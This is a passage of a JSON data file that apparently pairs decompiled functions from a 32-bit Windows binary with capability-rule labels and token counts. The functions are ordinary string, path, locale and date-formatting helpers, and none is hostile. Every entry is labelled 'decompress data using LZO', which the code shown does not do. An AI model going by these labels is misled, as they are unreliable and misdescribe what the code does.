        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuchar __cdecl fcn.0040a000(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_EDX;\n    int32_t iVar3;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_1h;\n    \n    if (-1 < in_EDX) {\n        var_ch = in_EDX + 1;\n        do {\n            iVar2 = *(arg_8h + -4);\n            iVar3 = *in_EAX;\n            if (iVar2 != 0) {\n                iVar2 = *(iVar2 + -4);\n            }\n            if (iVar3 != 0) {\n                iVar3 = *(iVar3 + -4);\n            }\n            uVar1 = fcn.004059dc(iVar3);\n            fcn.004059dc(iVar2, uVar1);\n            iVar2 = sub.kernel32.dll_CompareStringA_1();\n            if (iVar2 == 2) {\n                return 1;\n            }\n            in_EAX = in_EAX + 1;\n            var_ch = var_ch + -1;\n        } while (var_ch != 0);\n    }\n    return 0;\n}\n",
        "token_count": 296
    },
    "0040a2b4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040a2b4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    char cVar2;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x40a2c9;\n    fcn.004059cc();\n    uStack32 = 0x40a39d;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    if (in_EAX == 0) {\n        puStack28 = &stack0xfffffffc;\n        iVar1 = fcn.0040dbb8();\n        *(iVar1 + 0xc) = 3;\n        fcn.00404ec4();\n    }\n    fcn.0040e87c();\n    fcn.004055c8();\n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    if (in_EAX < 3) {\n        cVar2 = '\\x01';\n    }\n    else {\n        cVar2 = '\\0';\n        fcn.0040a290();\n    }\n    cVar2 = cVar2 == '\\0';\n    if (cVar2) {\n        fcn.0040a5a0();\n        fcn.00405974();\n    }\n    else {\n        cVar2 = '\\x01';\n    }\n    if (cVar2 == '\\0') {\n        fcn.0040a5a0();\n        cVar2 = fcn.0040a2b4();\n        if (cVar2 != '\\0') {\n            fcn.0040a84c();\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x40a3a4;\n    uStack32 = 0x40a39c;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 470
    },
    "0040a518": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.0040a518(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = in_EAX;\n    if (in_EAX != 0) {\n        iVar2 = *(in_EAX + -4);\n    }\n    if (iVar2 == 0) {\n        return 0;\n    }\n    while (cVar1 = fcn.0040e504(),  cVar1 == '\\x02') {\n        iVar2 = iVar2 + -1;\n    }\n    return in_EAX + -1 + iVar2;\n}\n",
        "token_count": 136
    },
    "0040a54c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040a54c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = param_2;\n    if (param_2 != 0) {\n        iVar3 = *(param_2 + -4);\n    }\n    fcn.004059dc();\n    do {\n        if (iVar3 < 1) {\n            return iVar3;\n        }\n        if ((*(param_2 + -1 + iVar3) != '\\0') && (iVar2 = fcn.0040aa40(),  iVar2 != 0)) {\n            cVar1 = fcn.0040e504();\n            if (cVar1 != '\\x02') {\n                return iVar3;\n            }\n            iVar3 = iVar3 + -1;\n        }\n        iVar3 = iVar3 + -1;\n    } while( true );\n}\n",
        "token_count": 209
    },
    "0040a5d4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a5d4(uint param_1, uint param_2)\n\n{\n    char *in_EAX;\n    char *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    bool bVar5;\n    \n    pcVar1 = in_EAX;\n    if (in_EAX != NULL) {\n        pcVar1 = *(in_EAX + -4);\n    }\n    if (pcVar1 < 2) {\n        bVar5 = false;\n    }\n    else {\n        bVar5 = in_EAX[1] == ':';\n    }\n    if (bVar5) {\n        fcn.00405a44(param_2);\n    }\n    else {\n        pcVar1 = in_EAX;\n        if (in_EAX != NULL) {\n            pcVar1 = *(in_EAX + -4);\n        }\n        if (pcVar1 < 2) {\n            bVar5 = false;\n        }\n        else {\n            bVar5 = *in_EAX == '\\\\';\n        }\n        if (bVar5) {\n            bVar5 = in_EAX[1] == '\\\\';\n        }\n        else {\n            bVar5 = false;\n        }\n        if (bVar5) {\n            iVar3 = 0;\n            iVar4 = 3;\n            while ((iVar2 = fcn.0040580c(),  iVar4 < iVar2 && (iVar3 < 2))) {\n                if (in_EAX[iVar4 + -1] == '\\\\') {\n                    iVar3 = iVar3 + 1;\n                }\n                if (iVar3 < 2) {\n                    iVar4 = iVar4 + 1;\n                }\n            }\n            fcn.00405a44(param_2);\n        }\n        else {\n            fcn.00405530();\n        }\n    }\n    return;\n}\n",
        "token_count": 407
    },
    "0040a928": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040a928(void)\n\n{\n    fcn.004059dc();\n    fcn.0040a8f4();\n    return;\n}\n",
        "token_count": 35
    },
    "0040a970": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040a970(uint param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t *in_EAX;\n    uint8_t *puVar2;\n    uint32_t uVar3;\n    \n    param_2 = param_2 - in_EAX;\n    if (param_2 == 0) {\n        return 0;\n    }\n    while( true ) {\n        uVar1 = in_EAX[param_2];\n        uVar3 = uVar1;\n        puVar2 = in_EAX;\n        if ((uVar1 != *in_EAX) || (uVar1 == 0)) break;\n        uVar1 = in_EAX[param_2 + 1];\n        uVar3 = uVar1;\n        if ((uVar1 != in_EAX[1]) || (uVar1 == 0)) goto code_r0x0040a9f2;\n        uVar1 = in_EAX[param_2 + 2];\n        uVar3 = uVar1;\n        if ((uVar1 != in_EAX[2]) || (uVar1 == 0)) goto code_r0x0040a9ef;\n        uVar1 = in_EAX[param_2 + 3];\n        uVar3 = uVar1;\n        if (uVar1 != in_EAX[3]) goto code_r0x0040a9ec;\n        puVar2 = in_EAX + 4;\n        if (uVar1 == 0) goto code_r0x0040a9e9;\n        uVar1 = puVar2[param_2];\n        uVar3 = uVar1;\n        if ((uVar1 != *puVar2) || (uVar1 == 0)) break;\n        uVar1 = puVar2[param_2 + 1];\n        uVar3 = uVar1;\n        if ((uVar1 != in_EAX[5]) || (uVar1 == 0)) goto code_r0x0040a9f2;\n        uVar1 = puVar2[param_2 + 2];\n        uVar3 = uVar1;\n        if ((uVar1 != in_EAX[6]) || (uVar1 == 0)) goto code_r0x0040a9ef;\n        uVar1 = puVar2[param_2 + 3];\n        uVar3 = uVar1;\n        if (uVar1 != in_EAX[7]) goto code_r0x0040a9ec;\n        in_EAX = in_EAX + 8;\n        puVar2 = in_EAX;\n        if (uVar1 == 0) goto code_r0x0040a9e9;\n    }\ncode_r0x0040a9f5:\n    return *puVar2 - uVar3;\ncode_r0x0040a9e9:\n    puVar2 = puVar2 + -4;\ncode_r0x0040a9ec:\n    puVar2 = puVar2 + 1;\ncode_r0x0040a9ef:\n    puVar2 = puVar2 + 1;\ncode_r0x0040a9f2:\n    puVar2 = puVar2 + 1;\n    goto code_r0x0040a9f5;\n}\n",
        "token_count": 726
    },
    "0040aad0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.0040aad0(void)\n\n{\n    int32_t in_EAX;\n    \n    return *(in_EAX + -4) + -4;\n}\n",
        "token_count": 38
    },
    "0040ab08": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040ab08(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        fcn.00402f1c();\n    }\n    return;\n}\n",
        "token_count": 48
    },
    "0040afac": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040afac(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    int32_t in_EDX;\n    int32_t arg_10h;\n    uint var_100ch;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = in_EDX;\n    if (in_EDX != 0) {\n        iVar1 = *(in_EDX + -4);\n    }\n    if (iVar1 < 0xc00) {\n        iVar1 = in_EDX;\n        if (in_EDX != 0) {\n            iVar1 = *(in_EDX + -4);\n        }\n        var_ch = fcn.0040aba0(arg_8h, in_ECX, iVar1);\n        iVar1 = 0x1000;\n    }\n    else {\n        iVar1 = in_EDX;\n        var_ch = in_EDX;\n        if (in_EDX != 0) {\n            iVar1 = *(in_EDX + -4);\n            var_ch = iVar1;\n        }\n    }\n    if (var_ch < iVar1 + -1) {\n        fcn.00405620();\n    }\n    else {\n        while (iVar1 + -1 <= var_ch) {\n            iVar1 = iVar1 * 2;\n            fcn.00405530();\n            fcn.00405c6c();\n            arg_10h = in_EDX;\n            if (in_EDX != 0) {\n                arg_10h = *(in_EDX + -4);\n            }\n            var_ch = fcn.0040aba0(arg_8h, in_ECX, arg_10h);\n        }\n        fcn.00405c6c();\n    }\n    return;\n}\n",
        "token_count": 390
    },
    "0040bda0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bda0(uint arg_8h)\n\n{\n    fcn.0040bd5c(arg_8h);\n    return;\n}\n",
        "token_count": 37
    },
    "0040beac": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040beac(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStackY336;\n    uint uStack308;\n    uint uStack304;\n    uchar *puStack300;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_14h;\n    uint var_eh;\n    uint var_4h;\n    \n    puStack300 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack304 = 0x40c00e;\n    uStack308 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffecc;\n    fcn.00405530();\n    var_14h._0_2_ = *(arg_8h + -0xe);\n    var_14h._2_2_ = *(arg_8h + -0x10);\n    var_eh._0_2_ = *(arg_8h + -0x12);\n    fcn.004055c8();\n    uVar1 = fcn.004059dc(&fcn.0040beac::var_114h, 0x100);\n    uVar1 = sub.kernel32.dll_GetThreadLocale_1(4, &fcn.0040beac::var_14h, uVar1);\n    uStackY336 = 0x40bf2f;\n    iVar2 = sub.kernel32.dll_GetDateFormatA(uVar1);\n    if (iVar2 != 0) {\n        uStackY336 = 0x40bf49;\n        fcn.004057a0();\n        if (in_EAX == 1) {\n            if (*0x4978cc == 4) {\n                if (*0x4978d0 == 1) {\n                    uStackY336 = 0x40bfa9;\n                    iVar2 = fcn.0040e540();\n                    if (iVar2 == 4) {\n                        fcn.0040e65c();\n                        fcn.00405728();\n                        fcn.0040e6e0();\n                        uStackY336 = 0x40bfed;\n                        fcn.00405620();\n                    }\n                }\n            }\n            else if (*0x4978cc == 0x11) {\n                fcn.0040e6e0();\n                fcn.00405a44();\n                uStackY336 = in_EDX;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStackY336;\n    fcn.00405530(0x40c015);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 612
    },
    "0040c028": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040c028(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char **in_EDX;\n    uint *in_FS_OFFSET;\n    char **ppcStackY332;\n    uint uStack304;\n    uint uStack300;\n    uchar *puStack296;\n    uint var_118h;\n    uint var_114h;\n    uint var_14h;\n    uint var_eh;\n    uint var_4h;\n    \n    puStack296 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack300 = 0x40c116;\n    uStack304 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed0;\n    fcn.00405530();\n    var_14h._0_2_ = *(arg_8h + -0xe);\n    var_14h._2_2_ = *(arg_8h + -0x10);\n    var_eh._0_2_ = *(arg_8h + -0x12);\n    if (in_EAX < 3) {\n        fcn.004055c8();\n    }\n    else {\n        fcn.004055c8();\n    }\n    uVar1 = fcn.004059dc(&fcn.0040c028::var_114h, 0x100);\n    uVar1 = sub.kernel32.dll_GetThreadLocale_1(4, &fcn.0040c028::var_14h, uVar1);\n    ppcStackY332 = 0x40c0b9;\n    iVar2 = sub.kernel32.dll_GetDateFormatA(uVar1);\n    if (iVar2 != 0) {\n        ppcStackY332 = 0x40c0cf;\n        fcn.004057a0();\n        if ((in_EAX == 1) && (**in_EDX == '0')) {\n            fcn.00405a44();\n            ppcStackY332 = in_EDX;\n        }\n    }\n    *in_FS_OFFSET = ppcStackY332;\n    fcn.00405530(0x40c11d);\n    return;\n}\n",
        "token_count": 494
    },
    "0040ca0c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040ca0c(int32_t param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffb4;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    int32_t var_14h;\n    int32_t var_10h;\n    uchar var_9h;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_14h = 0;\n    uStack44 = 0x40cad2;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    var_9h = 0;\n    puVar1 = &stack0xfffffffc;\n    var_8h = param_2;\n    if (param_1 != 0) {\n        fcn.0040c954();\n        fcn.00405a44(&var_14h);\n        var_10h = var_14h;\n        iVar3 = param_1;\n        if (param_1 != 0) {\n            iVar3 = *(param_1 + -4);\n        }\n        iVar4 = var_14h;\n        if (var_14h != 0) {\n            iVar4 = *(var_14h + -4);\n        }\n        uVar2 = fcn.004059dc(iVar4);\n        uVar2 = fcn.004059dc(iVar3, uVar2);\n        in_stack_ffffffb4 = 0x400;\n        iVar3 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar2);\n        puVar1 = puStack40;\n        if (iVar3 == 2) {\n            if (param_1 != 0) {\n                param_1 = *(param_1 + -4);\n            }\n            *var_8h = *var_8h + param_1;\n            var_9h = 1;\n        }\n    }\n    puStack40 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffb4;\n    fcn.00405530(0x40cad9);\n    return;\n}\n",
        "token_count": 518
    },
    "0040cae4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040cae4(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    char cStack16;\n    \n    uVar2 = 0;\n    fcn.0040c954();\n    iVar1 = in_EAX;\n    if (in_EAX != 0) {\n        iVar1 = *(in_EAX + -4);\n    }\n    if ((*param_2 <= iVar1) && (cStack16 = param_1,  *(in_EAX + -1 + *param_2) == cStack16)) {\n        *param_2 = *param_2 + 1;\n        uVar2 = 1;\n    }\n    return CONCAT44(param_1, uVar2);\n}\n",
        "token_count": 180
    },
    "0040d1a8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong fcn.0040d1a8(void)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    \n    cVar1 = fcn.0040cc64();\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        if (in_EAX != 0) {\n            in_EAX = *(in_EAX - 4);\n        }\n        uVar2 = in_EAX & 0xffffff00 | in_EAX < 1;\n    }\n    return CONCAT44(1, uVar2);\n}\n",
        "token_count": 135
    },
    "0040d1e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong fcn.0040d1e0(void)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    \n    cVar1 = fcn.0040cfb0();\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        if (in_EAX != 0) {\n            in_EAX = *(in_EAX - 4);\n        }\n        uVar2 = in_EAX & 0xffffff00 | in_EAX < 1;\n    }\n    return CONCAT44(1, uVar2);\n}\n",
        "token_count": 136
    },
    "0040d24c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040d24c(uint param_1, double *param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    double dStack28;\n    \n    uVar3 = 1;\n    cVar1 = fcn.0040cc64();\n    if (cVar1 == '\\0') {\n        uVar2 = 1;\n    }\n    else {\n        if (in_EAX != 0) {\n            in_EAX = *(in_EAX + -4);\n        }\n        if (in_EAX < 1) {\n            uVar2 = 1;\n        }\n        else {\n            uVar2 = fcn.0040cfb0();\n        }\n        uVar2 = uVar2 ^ 1;\n    }\n    if (uVar2 == 0) {\n        if (dStack28 < *0x40d2e4) {\n            *param_2 = dStack28 - 0.0;\n        }\n        else {\n            *param_2 = dStack28 + 0.0;\n        }\n    }\n    else {\n        uVar3 = fcn.0040d1e0();\n    }\n    return uVar3;\n}\n",
        "token_count": 278
    },
    "0040d670": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040d670(void)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    uStack44 = 0x40d840;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    iVar5 = 1;\n    fcn.00405530();\n    arg_8h = &fcn.0040d670::var_8h;\n    sub.kernel32.dll_GetThreadLocale_1();\n    fcn.0040d334(arg_8h);\n    iVar3 = fcn.00409f18();\n    if (iVar3 - 3U < 3) {\n        while (iVar3 = fcn.0040580c(),  iVar5 <= iVar3) {\n            uVar4 = *(in_EAX + -1 + iVar5);\n            if ((*((uVar4 >> 3) + 0x491828) >> (uVar4 & 7) & 1) == 0) {\n                iVar3 = fcn.0040a9fc();\n                if (iVar3 == 0) {\n                    fcn.00405818();\n                    iVar5 = iVar5 + 1;\n                }\n                else {\n                    iVar3 = fcn.0040a9fc();\n                    if (iVar3 == 0) {\n                        fcn.00405818();\n                        iVar5 = iVar5 + 3;\n                    }\n                    else {\n                        iVar3 = fcn.0040a9fc();\n                        if (iVar3 == 0) {\n                            fcn.00405818();\n                            iVar5 = iVar5 + 1;\n                        }\n                        else {\n                            cVar1 = *(in_EAX + -1 + iVar5);\n                            if ((cVar1 == 'Y') || (cVar1 == 'y')) {\n                                fcn.00405818();\n                            }\n                            else {\n                                fcn.00405718();\n                                fcn.00405818();\n                            }\n                        }\n                    }\n                }\n                iVar5 = iVar5 + 1;\n            }\n            else {\n                var_4h = fcn.0040e778();\n                arg_8h = &fcn.0040d670::var_10h;\n                fcn.00405a44();\n                fcn.00405818();\n                iVar5 = iVar5 + var_4h;\n            }\n        }\n    }\n    else {\n        if ((*0x4978cc == 4) || (*0x4978cc - 0x11U < 2)) {\n            bVar2 = true;\n        }\n        else {\n            bVar2 = false;\n        }\n        if (bVar2) {\n            for (; iVar3 = fcn.0040580c(),  iVar5 <= iVar3; iVar5 = iVar5 + 1) {\n                cVar1 = *(in_EAX + -1 + iVar5);\n                if ((cVar1 != 'G') && (cVar1 != 'g')) {\n                    fcn.00405718();\n                    fcn.00405818();\n                }\n            }\n        }\n        else {\n            fcn.00405584();\n        }\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack44 = 0x40d847;\n    iStack48 = 0x40d83f;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 874
    },
    "0040e540": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040e540(void)\n\n{\n    fcn.0040e564();\n    return;\n}\n",
        "token_count": 25
    },
    "0040e564": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040e564(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    if (param_2 < 1) {\n        bVar1 = true;\n    }\n    else {\n        iVar4 = in_EAX;\n        if (in_EAX != 0) {\n            iVar4 = *(in_EAX + -4);\n        }\n        bVar1 = iVar4 < param_2;\n    }\n    iVar4 = 0;\n    if ((!bVar1) && (iVar4 = param_2,  *0x4978d4 != '\\0')) {\n        iVar3 = 1;\n        iVar4 = 0;\n        if (0 < param_2) {\n            do {\n                uVar2 = *(in_EAX + -1 + iVar3);\n                if ((*((uVar2 >> 3) + 0x491828) >> (uVar2 & 7) & 1) == 0) {\n                    iVar3 = iVar3 + 1;\n                }\n                else {\n                    iVar3 = fcn.0040e7b0();\n                }\n                iVar4 = iVar4 + 1;\n            } while (iVar3 <= param_2);\n        }\n    }\n    return iVar4;\n}\n",
        "token_count": 310
    },
    "0040e5cc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e5cc(int32_t *arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t *in_ECX;\n    int32_t in_EDX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = in_EAX;\n    if (in_EAX != 0) {\n        iVar1 = *(in_EAX + -4);\n    }\n    iVar4 = 1;\n    iVar3 = 1;\n    while ((iVar3 < iVar1 && (iVar4 < in_EDX))) {\n        iVar4 = iVar4 + 1;\n        uVar2 = *(in_EAX + -1 + iVar3);\n        if ((*((uVar2 >> 3) + 0x491828) >> (uVar2 & 7) & 1) == 0) {\n            iVar3 = iVar3 + 1;\n        }\n        else {\n            iVar3 = fcn.0040e7b0();\n        }\n    }\n    if (((iVar4 == in_EDX) && (iVar3 < iVar1)) &&\n       (uVar2 = *(in_EAX + -1 + iVar3),  (*((uVar2 >> 3) + 0x491828) >> (uVar2 & 7) & 1) != 0)) {\n        iVar3 = fcn.0040e7b0();\n        iVar3 = iVar3 + -1;\n    }\n    *in_ECX = iVar4;\n    *arg_8h = iVar3;\n    return;\n}\n",
        "token_count": 375
    },
    "0040e65c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040e65c(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar *in_stack_ffffffe8;\n    int32_t *piVar3;\n    int32_t aiStack20 [2];\n    \n    piVar3 = aiStack20;\n    aiStack20[0] = 0;\n    if (param_2 < 1) {\n        bVar1 = true;\n    }\n    else {\n        iVar2 = in_EAX;\n        if (in_EAX != 0) {\n            iVar2 = *(in_EAX + -4);\n        }\n        bVar1 = iVar2 < param_2;\n    }\n    iVar2 = aiStack20[0];\n    if (((!bVar1) && (iVar2 = param_2,  1 < param_2)) && (iVar2 = param_2,  *0x4978d4 != '\\0')) {\n        fcn.0040e5cc(aiStack20);\n        if (aiStack20[0] < param_2 + -1) {\n            bVar1 = true;\n        }\n        else {\n            if (in_EAX != 0) {\n                in_EAX = *(in_EAX + -4);\n            }\n            bVar1 = in_EAX <= piVar3;\n        }\n        iVar2 = aiStack20[0];\n        if (bVar1) {\n            in_stack_ffffffe8 = NULL;\n        }\n        else {\n            in_stack_ffffffe8 = piVar3 + 1;\n        }\n    }\n    aiStack20[0] = iVar2;\n    return CONCAT44(aiStack20[0], in_stack_ffffffe8);\n}\n",
        "token_count": 388
    },
    "0040e6e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040e6e0(uint param_1, uchar *param_2)\n\n{\n    uchar *in_EAX;\n    uchar *puVar1;\n    uchar *puVar2;\n    uchar *in_stack_ffffffec;\n    uchar **ppuVar3;\n    uchar *apuStack16 [2];\n    \n    ppuVar3 = apuStack16;\n    apuStack16[0] = NULL;\n    puVar1 = apuStack16[0];\n    if (0 < param_2) {\n        puVar1 = in_EAX;\n        if (in_EAX != NULL) {\n            puVar1 = *(in_EAX + -4);\n        }\n        if ((puVar1 < param_2) && (param_2 = in_EAX,  in_EAX != NULL)) {\n            param_2 = *(in_EAX + -4);\n        }\n        puVar1 = param_2;\n        if (*0x4978d4 != '\\0') {\n            fcn.0040e5cc(apuStack16);\n            puVar2 = in_EAX;\n            if (in_EAX != NULL) {\n                puVar2 = *(in_EAX + -4);\n            }\n            in_stack_ffffffec = ppuVar3;\n            puVar1 = apuStack16[0];\n            if ((puVar2 < ppuVar3) && (in_stack_ffffffec = in_EAX,  in_EAX != NULL)) {\n                in_stack_ffffffec = *(in_EAX + -4);\n            }\n        }\n    }\n    apuStack16[0] = puVar1;\n    return CONCAT44(apuStack16[0], in_stack_ffffffec);\n}\n",
        "token_count": 375
    },
    "0040e7e8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040e7e8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    \n    if (param_2 < 1) {\n        bVar3 = false;\n    }\n    else {\n        iVar1 = in_EAX;\n        if (in_EAX != 0) {\n            iVar1 = *(in_EAX + -4);\n        }\n        bVar3 = param_2 <= iVar1;\n    }\n    if (bVar3) {\n        bVar3 = *(in_EAX + -1 + param_2) == '\\\\';\n    }\n    else {\n        bVar3 = false;\n    }\n    if (bVar3) {\n        uVar2 = fcn.0040e504();\n        return uVar2 & 0xffffff00 | uVar2 == '\\0';\n    }\n    return 0;\n}\n",
        "token_count": 217
    },
    "0040e830": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040e830(uint param_1)\n\n{\n    char cVar1;\n    \n    fcn.00405584(param_1);\n    cVar1 = fcn.0040e7e8();\n    if (cVar1 == '\\0') {\n        fcn.00405818();\n    }\n    return;\n}\n",
        "token_count": 75
    },
    "0040e87c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040e87c(uint param_1)\n\n{\n    char cVar1;\n    \n    fcn.00405584(param_1);\n    cVar1 = fcn.0040e7e8();\n    if (cVar1 != '\\0') {\n        fcn.00405c6c();\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "0040e904": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040e904(uint param_1, int32_t *param_2)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    \n    if (*0x4978d4 == '\\0') {\n        uVar4 = fcn.00409ae0();\n    }\n    else {\n        iVar3 = in_EAX;\n        if (in_EAX != 0) {\n            iVar3 = *(in_EAX + -4);\n        }\n        uVar4 = fcn.00405c6c();\n        iVar6 = 1;\n        if (0 < iVar3) {\n            do {\n                iVar5 = fcn.00405a3c();\n                *(iVar5 + -1 + iVar6) = *(in_EAX + -1 + iVar6);\n                uVar4 = *(in_EAX + -1 + iVar6);\n                if ((*((uVar4 >> 3) + 0x491828) >> (uVar4 & 7) & 1) == 0) {\n                    cVar2 = *(*param_2 + -1 + iVar6);\n                    uVar4 = cVar2 + 0xa5;\n                    if (cVar2 + 0xbfU < 0x1a) {\n                        uVar4 = fcn.00405a3c();\n                        pcVar1 = (uVar4 - 1) + iVar6;\n                        *pcVar1 = *pcVar1 + ' ';\n                    }\n                }\n                else {\n                    